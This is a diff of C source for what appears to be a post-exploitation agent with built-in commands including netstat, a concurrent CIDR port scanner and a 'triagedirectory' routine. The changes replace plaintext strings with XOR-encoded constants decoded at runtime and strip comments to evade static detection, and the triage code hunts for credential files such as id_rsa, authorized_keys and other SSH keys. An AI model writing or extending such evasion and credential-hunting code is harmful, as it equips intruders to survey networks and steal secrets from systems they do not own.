+        char fmt[ENC_LX_CP_FSTAT_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CP_FSTAT_ERR, ENC_LX_CP_FSTAT_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, src, strerror(errno));
     }
 
     int dst_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, st.st_mode & 07777);
     if (dst_fd < 0) {
         close(src_fd);
-        return out_append(buf, buf_size, 0, "cp: %s: %s\n", dst, strerror(errno));
+        char fmt[ENC_LX_CP_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_CP_ERR, ENC_LX_CP_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, dst, strerror(errno));
     }
 
     char tbuf[65536];
@@ -758,7 +919,9 @@ static int builtin_cp(const char *args, char *buf, int buf_size) {
         ssize_t nw = write(dst_fd, tbuf, (size_t)nr);
         if (nw != nr) {
             close(src_fd); close(dst_fd);
-            return out_append(buf, buf_size, 0, "cp: write error: %s\n", strerror(errno));
+            char fmt[ENC_LX_CP_WRITE_ERR_LEN + 1];
+            xor_dec(fmt, ENC_LX_CP_WRITE_ERR, ENC_LX_CP_WRITE_ERR_LEN);
+            return out_append(buf, buf_size, 0, fmt, strerror(errno));
         }
         total += nr;
     }
@@ -766,7 +929,9 @@ static int builtin_cp(const char *args, char *buf, int buf_size) {
     close(src_fd);
     close(dst_fd);
 
-    return out_append(buf, buf_size, 0, "copied: %s -> %s (%lld bytes)\n", src, dst, total);
+    char fmt[ENC_LX_COPIED_LEN + 1];
+    xor_dec(fmt, ENC_LX_COPIED, ENC_LX_COPIED_LEN);
+    return out_append(buf, buf_size, 0, fmt, src, dst, total);
 }
 
 /* -------------------------------------------------------------------------
@@ -774,12 +939,18 @@ static int builtin_cp(const char *args, char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 static int builtin_mv(const char *args, char *buf, int buf_size) {
     const char *p = ltrim(args);
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0, "usage: mv <src> <dst>\n");
+    if (*p == '\0') {
+        char fmt[ENC_LX_USAGE_MV_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_MV, ENC_LX_USAGE_MV_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     const char *sp = strchr(p, ' ');
-    if (!sp)
-        return out_append(buf, buf_size, 0, "usage: mv <src> <dst>\n");
+    if (!sp) {
+        char fmt[ENC_LX_USAGE_MV_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_MV, ENC_LX_USAGE_MV_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     char src[4096], dst[4096];
     int slen = (int)(sp - p);
@@ -791,28 +962,39 @@ static int builtin_mv(const char *args, char *buf, int buf_size) {
     int dlen = (int)strlen(dst);
     if (dlen > 0 && dst[dlen - 1] == '\n') dst[--dlen] = '\0';
 
-    if (rename(src, dst) == 0)
-        return out_append(buf, buf_size, 0, "moved: %s -> %s\n", src, dst);
+    if (rename(src, dst) == 0) {
+        char fmt[ENC_LX_MOVED_LEN + 1];
+        xor_dec(fmt, ENC_LX_MOVED, ENC_LX_MOVED_LEN);
+        return out_append(buf, buf_size, 0, fmt, src, dst);
+    }
 
-    if (errno != EXDEV)
-        return out_append(buf, buf_size, 0, "mv: %s -> %s: %s\n", src, dst, strerror(errno));
+    if (errno != EXDEV) {
+        char fmt[ENC_LX_MV_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_MV_ERR, ENC_LX_MV_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, src, dst, strerror(errno));
+    }
 
     /* cross-device: copy then unlink */
     char tmp_buf[256];
     int r = builtin_cp(args, tmp_buf, sizeof(tmp_buf));
     (void)r;
-    if (strncmp(tmp_buf, "copied:", 7) == 0) {
+    char copied_tag[ENC_LX_COPIED_COLON_LEN + 1];
+    xor_dec(copied_tag, ENC_LX_COPIED_COLON, ENC_LX_COPIED_COLON_LEN);
+    if (strncmp(tmp_buf, copied_tag, ENC_LX_COPIED_COLON_LEN) == 0) {
         unlink(src);
-        return out_append(buf, buf_size, 0, "moved: %s -> %s\n", src, dst);
+        char fmt[ENC_LX_MOVED_LEN + 1];
+        xor_dec(fmt, ENC_LX_MOVED, ENC_LX_MOVED_LEN);
+        return out_append(buf, buf_size, 0, fmt, src, dst);
     }
-    return out_append(buf, buf_size, 0, "mv: cross-device copy failed: %s\n", tmp_buf);
+    char fmt[ENC_LX_MV_XDEV_LEN + 1];
+    xor_dec(fmt, ENC_LX_MV_XDEV, ENC_LX_MV_XDEV_LEN);
+    return out_append(buf, buf_size, 0, fmt, tmp_buf);
 }
 
 /* -------------------------------------------------------------------------
  * 16. builtin_ifconfig
  * ---------------------------------------------------------------------- */
 
-/* Calculate prefix length from netmask */
 static int mask_to_prefix(uint32_t mask) {
     int bits = 0;
     mask = ntohl(mask);
@@ -823,8 +1005,29 @@ static int mask_to_prefix(uint32_t mask) {
 static int builtin_ifconfig(char *buf, int buf_size) {
     int pos = 0;
     struct ifaddrs *ifap = NULL;
-    if (getifaddrs(&ifap) != 0)
-        return out_append(buf, buf_size, 0, "ifconfig: getifaddrs: %s\n", strerror(errno));
+    if (getifaddrs(&ifap) != 0) {
+        char fmt[ENC_LX_IFCONFIG_ERR_LEN + 1];
+        xor_dec(fmt, ENC_LX_IFCONFIG_ERR, ENC_LX_IFCONFIG_ERR_LEN);
+        return out_append(buf, buf_size, 0, fmt, strerror(errno));
+    }
+
+    /* decode format strings once */
+    char fmt_inet[ENC_LX_INET_LEN + 1];
+    xor_dec(fmt_inet, ENC_LX_INET, ENC_LX_INET_LEN);
+    char fmt_inet6[ENC_LX_INET6_LEN + 1];
+    xor_dec(fmt_inet6, ENC_LX_INET6, ENC_LX_INET6_LEN);
+    char fmt_ether[ENC_LX_ETHER_LEN + 1];
+    xor_dec(fmt_ether, ENC_LX_ETHER, ENC_LX_ETHER_LEN);
+    char fmt_flags[ENC_LX_FLAGS_LEN + 1];
+    xor_dec(fmt_flags, ENC_LX_FLAGS, ENC_LX_FLAGS_LEN);
+    char flag_up[ENC_LX_FLAG_UP_LEN + 1];
+    xor_dec(flag_up, ENC_LX_FLAG_UP, ENC_LX_FLAG_UP_LEN);
+    char flag_running[ENC_LX_FLAG_RUNNING_LEN + 1];
+    xor_dec(flag_running, ENC_LX_FLAG_RUNNING, ENC_LX_FLAG_RUNNING_LEN);
+    char flag_loop[ENC_LX_FLAG_LOOP_LEN + 1];
+    xor_dec(flag_loop, ENC_LX_FLAG_LOOP, ENC_LX_FLAG_LOOP_LEN);
+    char sys_net_fmt[ENC_LX_SYS_NET_ADDR_LEN + 1];
+    xor_dec(sys_net_fmt, ENC_LX_SYS_NET_ADDR, ENC_LX_SYS_NET_ADDR_LEN);
 
     /* collect unique interface names */
     char ifaces[64][IFNAMSIZ];
@@ -842,7 +1045,6 @@ static int builtin_ifconfig(char *buf, int buf_size) {
     for (int i = 0; i < nifaces; i++) {
         pos = out_append(buf, buf_size, pos, "%s:\n", ifaces[i]);
 
-        /* gather flags from first entry for this iface */
         unsigned int flags = 0;
         for (struct ifaddrs *ifa = ifap; ifa; ifa = ifa->ifa_next) {
             if (ifa->ifa_name && strncmp(ifa->ifa_name, ifaces[i], IFNAMSIZ) == 0) {
@@ -864,12 +1066,11 @@ static int builtin_ifconfig(char *buf, int buf_size) {
                     struct sockaddr_in *nm = (struct sockaddr_in *)ifa->ifa_netmask;
                     prefix = mask_to_prefix(nm->sin_addr.s_addr);
                 }
-                pos = out_append(buf, buf_size, pos, "  inet  %s/%d\n", ipstr, prefix);
+                pos = out_append(buf, buf_size, pos, fmt_inet, ipstr, prefix);
             } else if (ifa->ifa_addr->sa_family == AF_INET6) {
                 char ipstr[INET6_ADDRSTRLEN];
                 struct sockaddr_in6 *sa6 = (struct sockaddr_in6 *)ifa->ifa_addr;
                 inet_ntop(AF_INET6, &sa6->sin6_addr, ipstr, sizeof(ipstr));
-                /* prefix length for IPv6: count bits in netmask */
                 int prefix6 = 0;
                 if (ifa->ifa_netmask) {
                     struct sockaddr_in6 *nm6 = (struct sockaddr_in6 *)ifa->ifa_netmask;
@@ -878,22 +1079,21 @@ static int builtin_ifconfig(char *buf, int buf_size) {
                         while (byte & 0x80) { prefix6++; byte <<= 1; }
                     }
                 }
-                pos = out_append(buf, buf_size, pos, "  inet6 %s/%d\n", ipstr, prefix6);
+                pos = out_append(buf, buf_size, pos, fmt_inet6, ipstr, prefix6);
             }
         }
 
         /* MAC from /sys/class/net/<iface>/address */
         char mac_path[128];
-        snprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", ifaces[i]);
+        snprintf(mac_path, sizeof(mac_path), sys_net_fmt, ifaces[i]);
         char mac_buf[24] = {0};
         if (read_small_file(mac_path, mac_buf, sizeof(mac_buf)) > 0)
-            pos = out_append(buf, buf_size, pos, "  ether %s\n", mac_buf);
+            pos = out_append(buf, buf_size, pos, fmt_ether, mac_buf);
 
-        /* flags */
-        pos = out_append(buf, buf_size, pos, "  flags:");
-        if (flags & IFF_UP)       pos = out_append(buf, buf_size, pos, " UP");
-        if (flags & IFF_RUNNING)  pos = out_append(buf, buf_size, pos, " RUNNING");
-        if (flags & IFF_LOOPBACK) pos = out_append(buf, buf_size, pos, " LOOPBACK");
+        pos = out_append(buf, buf_size, pos, "%s", fmt_flags);
+        if (flags & IFF_UP)       pos = out_append(buf, buf_size, pos, "%s", flag_up);
+        if (flags & IFF_RUNNING)  pos = out_append(buf, buf_size, pos, "%s", flag_running);
+        if (flags & IFF_LOOPBACK) pos = out_append(buf, buf_size, pos, "%s", flag_loop);
         pos = out_append(buf, buf_size, pos, "\n");
     }
 
@@ -906,26 +1106,42 @@ static int builtin_ifconfig(char *buf, int buf_size) {
  * ---------------------------------------------------------------------- */
 
 static const char *tcp_state_name(int s) {
+    /* decode all state names into static buffers (sequential, single-threaded) */
+    static char st_buf[12][32];
+    static int decoded = 0;
+    if (!decoded) {
+        xor_dec(st_buf[0],  ENC_LX_ST_ESTABLISHED, ENC_LX_ST_ESTABLISHED_LEN);
+        xor_dec(st_buf[1],  ENC_LX_ST_SYN_SENT,    ENC_LX_ST_SYN_SENT_LEN);
+        xor_dec(st_buf[2],  ENC_LX_ST_SYN_RECV,    ENC_LX_ST_SYN_RECV_LEN);
+        xor_dec(st_buf[3],  ENC_LX_ST_FIN_WAIT1,   ENC_LX_ST_FIN_WAIT1_LEN);
+        xor_dec(st_buf[4],  ENC_LX_ST_FIN_WAIT2,   ENC_LX_ST_FIN_WAIT2_LEN);
+        xor_dec(st_buf[5],  ENC_LX_ST_TIME_WAIT,   ENC_LX_ST_TIME_WAIT_LEN);
+        xor_dec(st_buf[6],  ENC_LX_ST_CLOSE,       ENC_LX_ST_CLOSE_LEN);
+        xor_dec(st_buf[7],  ENC_LX_ST_CLOSE_WAIT,  ENC_LX_ST_CLOSE_WAIT_LEN);
+        xor_dec(st_buf[8],  ENC_LX_ST_LAST_ACK,    ENC_LX_ST_LAST_ACK_LEN);
+        xor_dec(st_buf[9],  ENC_LX_ST_LISTEN,      ENC_LX_ST_LISTEN_LEN);
+        xor_dec(st_buf[10], ENC_LX_ST_CLOSING,     ENC_LX_ST_CLOSING_LEN);
+        xor_dec(st_buf[11], ENC_LX_ST_UNKNOWN,     ENC_LX_ST_UNKNOWN_LEN);
+        decoded = 1;
+    }
     switch (s) {
-        case 0x01: return "ESTABLISHED";
-        case 0x02: return "SYN_SENT";
-        case 0x03: return "SYN_RECV";
-        case 0x04: return "FIN_WAIT1";
-        case 0x05: return "FIN_WAIT2";
-        case 0x06: return "TIME_WAIT";
-        case 0x07: return "CLOSE";
-        case 0x08: return "CLOSE_WAIT";
-        case 0x09: return "LAST_ACK";
-        case 0x0A: return "LISTEN";
-        case 0x0B: return "CLOSING";
-        default:   return "UNKNOWN";
+        case 0x01: return st_buf[0];
+        case 0x02: return st_buf[1];
+        case 0x03: return st_buf[2];
+        case 0x04: return st_buf[3];
+        case 0x05: return st_buf[4];
+        case 0x06: return st_buf[5];
+        case 0x07: return st_buf[6];
+        case 0x08: return st_buf[7];
+        case 0x09: return st_buf[8];
+        case 0x0A: return st_buf[9];
+        case 0x0B: return st_buf[10];
+        default:   return st_buf[11];
     }
 }
 
-/* Convert little-endian hex IP (from /proc/net/tcp) to dotted quad. */
 static void hex_ip_to_str(const char *hex, char *out) {
     unsigned long val = strtoul(hex, NULL, 16);
-    /* /proc/net/tcp stores IPv4 in host byte order (little-endian on x86/arm) */
     unsigned char a = (unsigned char)((val >>  0) & 0xFF);
     unsigned char b = (unsigned char)((val >>  8) & 0xFF);
     unsigned char c = (unsigned char)((val >> 16) & 0xFF);
@@ -933,15 +1149,24 @@ static void hex_ip_to_str(const char *hex, char *out) {
     snprintf(out, 16, "%d.%d.%d.%d", a, b, c, d);
 }
 
-/* Try to find PID owning a socket inode by scanning /proc/[pid]/fd/ */
 static int find_pid_for_inode(unsigned long inode) {
     if (getuid() != 0) return -1;
 
-    DIR *pdir = opendir("/proc");
+    char proc_path[ENC_LX_PROC_LEN + 1];
+    xor_dec(proc_path, ENC_LX_PROC, ENC_LX_PROC_LEN);
+
+    DIR *pdir = opendir(proc_path);
     if (!pdir) return -1;
 
+    char sock_fmt[ENC_LX_SOCKET_INODE_LEN + 1];
+    xor_dec(sock_fmt, ENC_LX_SOCKET_INODE, ENC_LX_SOCKET_INODE_LEN);
     char target[64];
-    snprintf(target, sizeof(target), "socket:[%lu]", inode);
+    snprintf(target, sizeof(target), sock_fmt, inode);
+
+    char fd_fmt[ENC_LX_PROC_PID_FD_LEN + 1];
+    xor_dec(fd_fmt, ENC_LX_PROC_PID_FD, ENC_LX_PROC_PID_FD_LEN);
+    char fdent_fmt[ENC_LX_PROC_PID_FD_ENT_LEN + 1];
+    xor_dec(fdent_fmt, ENC_LX_PROC_PID_FD_ENT, ENC_LX_PROC_PID_FD_ENT_LEN);
 
     int found_pid = -1;
     struct dirent *de;
@@ -952,7 +1177,7 @@ static int find_pid_for_inode(unsigned long inode) {
         if (!ep || *ep != '\0') continue;
 
         char fd_path[128];
-        snprintf(fd_path, sizeof(fd_path), "/proc/%ld/fd", pid_num);
+        snprintf(fd_path, sizeof(fd_path), fd_fmt, pid_num);
         DIR *fdir = opendir(fd_path);
         if (!fdir) continue;
 
@@ -960,7 +1185,7 @@ static int find_pid_for_inode(unsigned long inode) {
         while ((fde = readdir(fdir)) != NULL) {
             if (fde->d_name[0] == '.') continue;
             char link_path[192];
-            snprintf(link_path, sizeof(link_path), "/proc/%ld/fd/%s", pid_num, fde->d_name);
+            snprintf(link_path, sizeof(link_path), fdent_fmt, pid_num, fde->d_name);
             char link_buf[128] = {0};
             ssize_t lr = readlink(link_path, link_buf, sizeof(link_buf) - 1);
             if (lr > 0) {
@@ -977,15 +1202,15 @@ static int find_pid_for_inode(unsigned long inode) {
     return found_pid;
 }
 
-/* Get process name from /proc/[pid]/comm */
 static void get_comm(int pid, char *out, int out_size) {
+    char comm_fmt[ENC_LX_PROC_PID_COMM_LEN + 1];
+    xor_dec(comm_fmt, ENC_LX_PROC_PID_COMM, ENC_LX_PROC_PID_COMM_LEN);
     char path[64];
-    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
+    snprintf(path, sizeof(path), comm_fmt, pid);
     if (read_small_file(path, out, out_size) <= 0)
         strncpy(out, "?", (size_t)(out_size - 1));
 }
 
-/* Parse /proc/net/tcp or /proc/net/udp and append to output */
 static int parse_net_file(const char *proto, const char *netfile,
                            char *buf, int buf_size, int pos) {
     int fd = open(netfile, O_RDONLY);
@@ -1004,12 +1229,6 @@ static int parse_net_file(const char *proto, const char *netfile,
         if (nl) *nl = '\0';
         if (first_line) { first_line = 0; line = nl ? nl + 1 : NULL; continue; }
 
-        /* fields:
-         * sl  local_addr  rem_addr  state  tx_queue:rx_queue  tr  tm->when
-         * retransmit  uid  timeout  inode
-         * 0   1           2         3      4                   5   6
-         * 7            8    9        10
-         */
         char sl[16], local[32], rem[32], state_hex[8];
         char unused1[32], unused2[16], unused3[16], unused4[16];
         char uid_str[16], unused5[16], inode_str[32];
@@ -1022,7 +1241,6 @@ static int parse_net_file(const char *proto, const char *netfile,
 
         if (fields < 11) { line = nl ? nl + 1 : NULL; continue; }
 
-        /* parse local addr */
         char *colon_l = strchr(local, ':');
         char local_ip[20] = "?", local_port_str[8] = "?";
         if (colon_l) {
@@ -1032,7 +1250,6 @@ static int parse_net_file(const char *proto, const char *netfile,
             snprintf(local_port_str, sizeof(local_port_str), "%u", lp);
         }
 
-        /* parse remote addr */
         char *colon_r = strchr(rem, ':');
         char rem_ip[20] = "?", rem_port_str[8] = "*";
         if (colon_r) {
@@ -1046,7 +1263,6 @@ static int parse_net_file(const char *proto, const char *netfile,
         int state_int = (int)strtol(state_hex, NULL, 16);
         const char *state_name = tcp_state_name(state_int);
 
-        /* inode -> pid */
         unsigned long inode_num = strtoul(inode_str, NULL, 10);
         int owner_pid = find_pid_for_inode(inode_num);
         char pname[32] = "-";
@@ -1072,13 +1288,46 @@ static int parse_net_file(const char *proto, const char *netfile,
 
 static int builtin_netstat(char *buf, int buf_size) {
     int pos = 0;
+
+    char h_proto[ENC_LX_NETSTAT_HDR_LEN + 1];
+    xor_dec(h_proto, ENC_LX_NETSTAT_HDR, ENC_LX_NETSTAT_HDR_LEN);
+    char h_local[ENC_LX_NETSTAT_LOCAL_LEN + 1];
+    xor_dec(h_local, ENC_LX_NETSTAT_LOCAL, ENC_LX_NETSTAT_LOCAL_LEN);
+    char h_remote[ENC_LX_NETSTAT_REMOTE_LEN + 1];
+    xor_dec(h_remote, ENC_LX_NETSTAT_REMOTE, ENC_LX_NETSTAT_REMOTE_LEN);
+    char h_state[ENC_LX_NETSTAT_STATE_LEN + 1];
+    xor_dec(h_state, ENC_LX_NETSTAT_STATE, ENC_LX_NETSTAT_STATE_LEN);
+    char h_pid[ENC_LX_NETSTAT_PID_LEN + 1];
+    xor_dec(h_pid, ENC_LX_NETSTAT_PID, ENC_LX_NETSTAT_PID_LEN);
+    char h_proc[ENC_LX_NETSTAT_PROC_LEN + 1];
+    xor_dec(h_proc, ENC_LX_NETSTAT_PROC, ENC_LX_NETSTAT_PROC_LEN);
+
     pos = out_append(buf, buf_size, pos,
         "%-5s  %-22s %-22s %-13s %-6s %s\n",
-        "PROTO", "LOCAL", "REMOTE", "STATE", "PID", "PROCESS");
-    pos = parse_net_file("tcp",  "/proc/net/tcp",  buf, buf_size, pos);
-    pos = parse_net_file("tcp6", "/proc/net/tcp6", buf, buf_size, pos);
-    pos = parse_net_file("udp",  "/proc/net/udp",  buf, buf_size, pos);
-    pos = parse_net_file("udp6", "/proc/net/udp6", buf, buf_size, pos);
+        h_proto, h_local, h_remote, h_state, h_pid, h_proc);
+
+    char p_tcp[ENC_LX_PROTO_TCP_LEN + 1];
+    xor_dec(p_tcp, ENC_LX_PROTO_TCP, ENC_LX_PROTO_TCP_LEN);
+    char p_tcp6[ENC_LX_PROTO_TCP6_LEN + 1];
+    xor_dec(p_tcp6, ENC_LX_PROTO_TCP6, ENC_LX_PROTO_TCP6_LEN);
+    char p_udp[ENC_LX_PROTO_UDP_LEN + 1];
+    xor_dec(p_udp, ENC_LX_PROTO_UDP, ENC_LX_PROTO_UDP_LEN);
+    char p_udp6[ENC_LX_PROTO_UDP6_LEN + 1];
+    xor_dec(p_udp6, ENC_LX_PROTO_UDP6, ENC_LX_PROTO_UDP6_LEN);
+
+    char f_tcp[ENC_LX_PROC_NET_TCP_LEN + 1];
+    xor_dec(f_tcp, ENC_LX_PROC_NET_TCP, ENC_LX_PROC_NET_TCP_LEN);
+    char f_tcp6[ENC_LX_PROC_NET_TCP6_LEN + 1];
+    xor_dec(f_tcp6, ENC_LX_PROC_NET_TCP6, ENC_LX_PROC_NET_TCP6_LEN);
+    char f_udp[ENC_LX_PROC_NET_UDP_LEN + 1];
+    xor_dec(f_udp, ENC_LX_PROC_NET_UDP, ENC_LX_PROC_NET_UDP_LEN);
+    char f_udp6[ENC_LX_PROC_NET_UDP6_LEN + 1];
+    xor_dec(f_udp6, ENC_LX_PROC_NET_UDP6, ENC_LX_PROC_NET_UDP6_LEN);
+
+    pos = parse_net_file(p_tcp,  f_tcp,  buf, buf_size, pos);
+    pos = parse_net_file(p_tcp6, f_tcp6, buf, buf_size, pos);
+    pos = parse_net_file(p_udp,  f_udp,  buf, buf_size, pos);
+    pos = parse_net_file(p_udp6, f_udp6, buf, buf_size, pos);
     return pos;
 }
 
@@ -1091,8 +1340,8 @@ static int builtin_netstat(char *buf, int buf_size) {
 
 typedef struct {
     int       fd;
-    uint32_t  ip;     /* network byte order */
-    uint16_t  port;   /* host byte order */
+    uint32_t  ip;
+    uint16_t  port;
     int       used;
 } ScanSlot;
 
@@ -1109,8 +1358,6 @@ static int check_slot_connected(ScanSlot *s) {
     return (sockerr == 0) ? 1 : 0;
 }
 
-/* Expand CIDR to list of host IPs (network byte order).
- * Returns count; allocates *ips (caller must free). */
 static int expand_cidr(const char *cidr, uint32_t **ips) {
     char host_part[64] = {0};
     int prefix = 32;
@@ -1132,7 +1379,6 @@ static int expand_cidr(const char *cidr, uint32_t **ips) {
 
     uint32_t base = ntohl(addr.s_addr);
 
-    /* /32 or plain IP: single host, no CIDR math */
     if (prefix == 32) {
         *ips = malloc(sizeof(uint32_t));
         if (!*ips) return 0;
@@ -1142,23 +1388,20 @@ static int expand_cidr(const char *cidr, uint32_t **ips) {
 
     uint32_t mask = (prefix == 0) ? 0 : (~0u << (32 - prefix));
     uint32_t network = base & mask;
-    uint32_t count = ~mask; /* number of addresses in block */
+    uint32_t count = ~mask;
 
-    /* cap at 1024 hosts to avoid memory blow-up */
     if (count > 1024) count = 1024;
 
     *ips = malloc(count * sizeof(uint32_t));
     if (!*ips) return 0;
 
     uint32_t n = 0;
-    for (uint32_t h = 1; h < count; h++) {   /* skip network address, skip broadcast */
+    for (uint32_t h = 1; h < count; h++) {
         (*ips)[n++] = htonl(network + h);
     }
     return (int)n;
 }
 
-/* Parse port spec: "22" or "22,80,443" or "1-1024" → sorted array.
- * Returns count; allocates *ports (caller must free). */
 static int parse_ports(const char *spec, uint16_t **ports) {
     int cap = 64;
     *ports = malloc((size_t)cap * sizeof(uint16_t));
@@ -1207,17 +1450,21 @@ done:
 static int builtin_portscan(const char *args, char *buf, int buf_size) {
     int pos = 0;
     const char *p = ltrim(args);
-    if (*p == '\0')
-        return out_append(buf, buf_size, 0,
-                          "usage: portscan <host|cidr> <ports>\n"
-                          "  e.g. portscan 192.168.1.1 22,80,443\n"
-                          "       portscan 192.168.1.0/24 1-1024\n");
+    if (*p == '\0') {
+        char fmt1[ENC_LX_USAGE_PORTSCAN_LEN + 1];
+        xor_dec(fmt1, ENC_LX_USAGE_PORTSCAN, ENC_LX_USAGE_PORTSCAN_LEN);
+        char fmt2[ENC_LX_USAGE_PORTSCAN2_LEN + 1];
+        xor_dec(fmt2, ENC_LX_USAGE_PORTSCAN2, ENC_LX_USAGE_PORTSCAN2_LEN);
+        pos = out_append(buf, buf_size, 0, "%s%s", fmt1, fmt2);
+        return pos;
+    }
 
-    /* split host_spec and port_spec on first space */
     const char *sp = strchr(p, ' ');
-    if (!sp)
-        return out_append(buf, buf_size, 0,
-                          "usage: portscan <host|cidr> <ports>\n");
+    if (!sp) {
+        char fmt[ENC_LX_USAGE_PORTSCAN_LEN + 1];
+        xor_dec(fmt, ENC_LX_USAGE_PORTSCAN, ENC_LX_USAGE_PORTSCAN_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
+    }
 
     char host_spec[128] = {0};
     int hslen = (int)(sp - p);
@@ -1234,31 +1481,33 @@ static int builtin_portscan(const char *args, char *buf, int buf_size) {
 
     if (nips == 0 || nports == 0) {
         free(ips); free(ports);
-        return out_append(buf, buf_size, 0, "portscan: invalid host or port spec\n");
+        char fmt[ENC_LX_PORTSCAN_INVAL_LEN + 1];
+        xor_dec(fmt, ENC_LX_PORTSCAN_INVAL, ENC_LX_PORTSCAN_INVAL_LEN);
+        return out_append(buf, buf_size, 0, "%s", fmt);
     }
+
+    char open_fmt[ENC_LX_PORT_OPEN_LEN + 1];
+    xor_dec(open_fmt, ENC_LX_PORT_OPEN, ENC_LX_PORT_OPEN_LEN);
 
     int open_count = 0;
     ScanSlot slots[PORTSCAN_MAX_FDS];
     memset(slots, 0, sizeof(slots));
 
-    /* total work items */
     long total_work = (long)nips * nports;
     long work_idx   = 0;
     int  ip_i   = 0;
     int  port_i = 0;
 
-    while (work_idx < total_work || /* pending slots? */ ({
+    while (work_idx < total_work || ({
             int _any = 0;
             for (int _i = 0; _i < PORTSCAN_MAX_FDS; _i++) if (slots[_i].used) { _any = 1; break; }
             _any; })) {
 
-        /* fill free slots */
         while (work_idx < total_work) {
-            /* find a free slot */
             int free_slot = -1;
             for (int s = 0; s < PORTSCAN_MAX_FDS; s++)
                 if (!slots[s].used) { free_slot = s; break; }
-            if (free_slot < 0) break; /* all slots busy */
+            if (free_slot < 0) break;
 
             uint32_t cur_ip   = ips[ip_i];
             uint16_t cur_port = ports[port_i];
@@ -1281,11 +1530,9 @@ static int builtin_portscan(const char *args, char *buf, int buf_size) {
 
             int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
             if (r == 0) {
-                /* immediately connected */
                 char ipstr[INET_ADDRSTRLEN];
                 inet_ntop(AF_INET, &cur_ip, ipstr, sizeof(ipstr));
-                pos = out_append(buf, buf_size, pos,
-                                 "%-15s  %d/tcp    open\n", ipstr, cur_port);
+                pos = out_append(buf, buf_size, pos, open_fmt, ipstr, cur_port);
                 open_count++;
                 close(fd);
                 continue;
@@ -1298,7 +1545,6 @@ static int builtin_portscan(const char *args, char *buf, int buf_size) {
             slots[free_slot].used = 1;
         }
 
-        /* build select fdset with timeout */
         fd_set wfds;
         FD_ZERO(&wfds);
         int max_fd = -1;
@@ -1313,21 +1559,18 @@ static int builtin_portscan(const char *args, char *buf, int buf_size) {
         struct timeval tv = { PORTSCAN_TIMEOUT_SEC, 0 };
         select(max_fd + 1, NULL, &wfds, NULL, &tv);
 
-        /* check results */
         for (int s = 0; s < PORTSCAN_MAX_FDS; s++) {
             if (!slots[s].used) continue;
             if (FD_ISSET(slots[s].fd, &wfds)) {
                 if (check_slot_connected(&slots[s])) {
                     char ipstr[INET_ADDRSTRLEN];
                     inet_ntop(AF_INET, &slots[s].ip, ipstr, sizeof(ipstr));
-                    pos = out_append(buf, buf_size, pos,
-                                     "%-15s  %d/tcp    open\n", ipstr, slots[s].port);
+                    pos = out_append(buf, buf_size, pos, open_fmt, ipstr, slots[s].port);
                     open_count++;
                 }
                 close(slots[s].fd);
                 slots[s].used = 0;
             } else {
-                /* timeout — close and mark done */
                 close(slots[s].fd);
                 slots[s].used = 0;
             }
@@ -1336,9 +1579,9 @@ static int builtin_portscan(const char *args, char *buf, int buf_size) {
 
     free(ips);
     free(ports);
-    pos = out_append(buf, buf_size, pos,
-                     "Scan complete: %d open port(s) (%d host(s) scanned)\n",
-                     open_count, nips);
+    char scan_fmt[ENC_LX_SCAN_COMPLETE_LEN + 1];
+    xor_dec(scan_fmt, ENC_LX_SCAN_COMPLETE, ENC_LX_SCAN_COMPLETE_LEN);
+    pos = out_append(buf, buf_size, pos, scan_fmt, open_count, nips);
     return pos;
 }
 
@@ -1346,13 +1589,7 @@ static int builtin_portscan(const char *args, char *buf, int buf_size) {
  * 19. builtin_triagedirectory
  * ---------------------------------------------------------------------- */
 
-/* Categories for triage */
 #define TRIAGE_CATS 10
-static const char *triage_cat_names[TRIAGE_CATS] = {
-    "SSH Keys", "Cloud Credentials", "Git", "Shell History",
-    "Environment Files", "Databases", "Certificates", "Passwords",
-    "Tokens", "Misc Credentials"
-};
 
 typedef struct {
     char   path[512];
@@ -1371,64 +1608,112 @@ static int triage_categorize(const char *path) {
     base = base ? base + 1 : path;
 
     /* SSH */
-    if (strcmp(base, "id_rsa") == 0 || strcmp(base, "id_ed25519") == 0 ||
-        strcmp(base, "id_ecdsa") == 0 || strcmp(base, "id_dsa") == 0 ||
-        strcmp(base, "known_hosts") == 0 || strcmp(base, "authorized_keys") == 0)
+    char s_id_rsa[ENC_LX_ID_RSA_LEN + 1]; xor_dec(s_id_rsa, ENC_LX_ID_RSA, ENC_LX_ID_RSA_LEN);
+    char s_id_ed[ENC_LX_ID_ED25519_LEN + 1]; xor_dec(s_id_ed, ENC_LX_ID_ED25519, ENC_LX_ID_ED25519_LEN);
+    char s_id_ec[ENC_LX_ID_ECDSA_LEN + 1]; xor_dec(s_id_ec, ENC_LX_ID_ECDSA, ENC_LX_ID_ECDSA_LEN);
+    char s_id_dsa[ENC_LX_ID_DSA_LEN + 1]; xor_dec(s_id_dsa, ENC_LX_ID_DSA, ENC_LX_ID_DSA_LEN);
+    char s_kh[ENC_LX_KNOWN_HOSTS_LEN + 1]; xor_dec(s_kh, ENC_LX_KNOWN_HOSTS, ENC_LX_KNOWN_HOSTS_LEN);
+    char s_ak[ENC_LX_AUTH_KEYS_LEN + 1]; xor_dec(s_ak, ENC_LX_AUTH_KEYS, ENC_LX_AUTH_KEYS_LEN);
+
+    if (strcmp(base, s_id_rsa) == 0 || strcmp(base, s_id_ed) == 0 ||
+        strcmp(base, s_id_ec) == 0 || strcmp(base, s_id_dsa) == 0 ||
+        strcmp(base, s_kh) == 0 || strcmp(base, s_ak) == 0)
         return 0;
-    if (strstr(path, ".ssh/") || strstr(path, "/.ssh"))
-        if (strstr(base, ".pem") || strstr(base, ".key")) return 0;
+
